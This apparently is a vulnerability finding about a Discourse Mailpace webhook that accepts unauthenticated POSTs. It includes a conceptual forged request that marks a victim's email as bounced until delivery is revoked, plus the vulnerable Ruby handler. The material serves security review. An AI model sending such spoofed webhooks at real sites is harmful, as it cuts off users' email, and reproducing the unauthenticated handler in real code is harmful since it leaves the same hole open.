title: Missing Authentication/Verification on Mailpace Webhook
analysis:
An attacker can make unauthenticated HTTP POST requests to `/webhooks/mailpace` and bypass all signature/origin validation. By constructing a spoofed payload with a known or guessed `message_id` and the target user's `to_address`, the attacker can repeatedly trigger a bounced event, increasing the target's bounce score. This eventually triggers email revocation once the bounce score exceeds the threshold, disabling future emails to the victim.

### Conceptual Exploit Payload

```http
POST /webhooks/mailpace HTTP/1.1
Host: discourse.example.com
Content-Type: application/json

{
  "payload": {
    "message_id": "<predictable_or_known_message_id_here>",
    "to": "victim_email@example.com",
    "status": "bounced"
  }
}
```
snippet:
def mailpace
    # see https://docs.mailpace.com/guide/webhooks#email-events

    message_id = Email::MessageIdService.message_id_clean(params["payload"]["message_id"])
    to_address = params["payload"]["to"]
    status = params["payload"]["status"]

    case status
    when "bounced"
      process_bounce(message_id, to_address, SiteSetting.hard_bounce_score)
    when "deferred"
      process_bounce(message_id, to_address, SiteSetting.soft_bounce_score)
    end

    success
  end
vuln_type: CWE-306: Missing Authentication for Critical Function
